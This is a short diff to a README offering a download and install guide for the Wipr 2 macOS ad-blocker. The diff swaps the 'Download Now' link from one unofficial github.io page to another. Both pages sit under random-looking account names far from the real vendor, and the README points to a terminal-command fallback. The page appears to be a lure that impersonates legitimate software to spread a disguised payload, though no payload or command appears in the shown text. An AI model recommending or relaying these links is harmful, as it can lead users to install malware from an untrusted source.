@@ -3,7 +3,7 @@
 
 Effortlessly download and install Wipr 2, a powerful ad-blocker for macOS, to enjoy a seamless, distraction-free browsing experience. Follow the step-by-step guide below to get started! 😊
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://fituganshfgh.github.io/.github/wipr2)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/wipr2)
 
 If the download button doesn’t work, follow the terminal command instructions below for a smooth installation.
 
